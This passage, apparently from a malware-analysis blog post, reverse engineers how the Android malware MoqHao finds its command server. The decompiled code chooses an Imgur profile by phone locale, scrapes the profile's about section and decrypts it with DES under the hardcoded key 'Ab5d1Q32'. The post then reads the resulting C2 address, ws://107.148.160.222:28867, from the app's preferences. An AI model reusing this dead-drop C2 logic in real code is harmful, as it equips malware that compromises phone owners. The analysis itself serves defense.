</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">string3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">).</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;last_addr&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">(</span><span class="n">string3</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">m759g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">this</span><span class="p">.</span><span class="na">f400c</span><span class="p">.</span><span class="na">f860a</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">m759g</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">m217i3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0532u</span><span class="p">.</span><span class="na">m217i</span><span class="p">(</span><span class="n">m759g</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ssl://&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m217i3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0532u</span><span class="p">.</span><span class="na">m221e</span><span class="p">(</span><span class="n">m759g</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ssl://&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;wss://&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">4</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ws://&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">m759g</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Store C2 IP address into &#39;last_addr&#39; SharedPreferences</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Loader</span><span class="p">.</span><span class="na">access$getPreferences$p</span><span class="p">(</span><span class="n">Loader</span><span class="p">.</span><span class="na">this</span><span class="p">).</span><span class="na">edit</span><span class="p">().</span><span class="na">putString</span><span class="p">(</span><span class="s">&#34;last_addr&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">).</span><span class="na">apply</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">str</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;null......&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The string <code>&quot;chrome|shaoye77@imgur|sha...&quot;</code> is split with the separator <code>|</code>. Then, if the locale of the phone is :</p>
<ul>
<li><code>ko</code> (Korean), use <code>shaoye77@imgur</code></li>
<li><code>ja</code> (Japan), use <code>shaoye88@imgur</code></li>
<li>else, use <code>shaoye99@imgur</code></li>
</ul>
<p>Then, send the imgur profile to <code>C0337t.m759g(string2);</code>. With a French phone, we will get <code>C0337t.m759g(&quot;shaoye99@imgur&quot;);</code>, this corresponds to the imgur profile we saw on Burpsuite.</p>
<p>The <code>m759g</code> function returns the C2 IP &amp; port (we will reverse it very soon), then store it inside &ldquo;last_addr&rdquo; SharedPreferences.</p>
<p>So, to get the C2 IP address and port, we have <strong>two</strong> ways :</p>
<ol>
<li>Extract <code>last_addr</code> from the SharedPreferences.</li>
<li>Analyse the function <code>m759g</code> to determine how MoqHao retrieves the C2 from the Imgur profiles.</li>
</ol>
<p>The first way is very simple, you just need to view the content of <code>pref.xml</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">$ adb shell cat /data/data/<span class="nt">&lt;package_name&gt;</span>/shared_prefs/pref.xml
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;map&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;int</span> <span class="na">name=</span><span class="s">&#34;shut&#34;</span> <span class="na">value=</span><span class="s">&#34;4&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;int</span> <span class="na">name=</span><span class="s">&#34;create&#34;</span> <span class="na">value=</span><span class="s">&#34;4&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">&#34;last_addr&#34;</span><span class="nt">&gt;</span>ws://107.148.160.222:28867<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/map&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And bingo, we got our C2 <code>ws://107.148.160.222:28867</code> !</p>
<p>The second way, is also quite simple, we need to go through the Java code. Let&rsquo;s do this by analysing the method <code>C0337t.m759g(string2)</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">m759g</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">List</span><span class="w"> </span><span class="n">m204M</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m320d</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;acc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m204M</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0533v</span><span class="p">.</span><span class="na">m204M</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="o">[]</span><span class="p">{</span><span class="sc">&#39;@&#39;</span><span class="p">},</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">6</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;debug&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;vk&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m752n</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;youtube&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m751o</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;ins&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m753m</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;GoogleDoc&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m756j</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;GoogleDoc2&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m755k</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;blogger&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m758h</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;blogspot&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">m757i</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">C0474i</span><span class="p">.</span><span class="na">m323a</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">1</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;imgur&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// if NOT EQUALS to imgur</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">m754l</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">m204M</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">));</span><span class="w"> </span><span class="c1">// then, imgur request is made</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>m759g</code> calls a function with the name of the profile in parameter according to the platform used (imgur, vk, youtube, googledoc, &hellip;).</p>
<p>For example, the string <code>shaoye99@imgur</code> is split on <code>@</code> :</p>
<ul>
<li><code>shaoye99</code> = <code>m204M.get(0)</code></li>
<li><code>imgur</code> = <code>m204M.get(1)</code></li>
</ul>
<p>With our imgur profile, we will call <code>m754l('shaoye99')</code>. Its goal is to extract the about section of the imgur profile and decrypt it with DES in CBC mode.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Extract about section</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="w"> </span><span class="nf">m754l</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="w"> </span><span class="n">r7</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m320d</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;acc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0482q</span><span class="w"> </span><span class="n">c0482q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0482q</span><span class="p">.</span><span class="na">f864a</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;https://imgur.com/user/%s/about&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">copyOf</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">str</span><span class="p">},</span><span class="w"> </span><span class="n">1</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">format</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;java.lang.String.format(format, *args)&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// search for regex :</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// - ffgtrrt([\\w_-]+?)ffgtrrt</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// - bgfrewi([\\w_-]+?)bgfrewi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// - htynff([\\w_-]+?)htynff</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// - gfjytg([\\w_-]+?)gfjytg</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// - dseregn([\\w_-]+?)dseregn</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// results in &#39;group&#39; variable</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">group</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m762d</span><span class="p">(</span><span class="n">group</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="na">e</span><span class="p">(</span><span class="s">&#34;MSG&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;DNS ERR&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">str2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Base64 decode and call function to decrypt</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">m762d</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m320d</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;str&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// check str is not null</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">8</span><span class="p">);</span><span class="w"> </span><span class="c1">// base64 decode</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">decode</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Base64.decode(str, 8)&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// check decode is not null</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">m764b</span><span class="p">(</span><span class="n">decode</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Ab5d1Q32&#34;</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// decrypt with DES (mode CBC)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Decrypt with KEY = IV = &#34;Ab5d1Q32&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">m764b</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bArr</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m320d</span><span class="p">(</span><span class="n">bArr</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;src&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m320d</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;paramString&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SecureRandom</span><span class="w"> </span><span class="n">secureRandom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecureRandom</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Charset</span><span class="w"> </span><span class="n">charset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C0510d</span><span class="p">.</span><span class="na">f880a</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">charset</span><span class="p">);</span><span class="w">
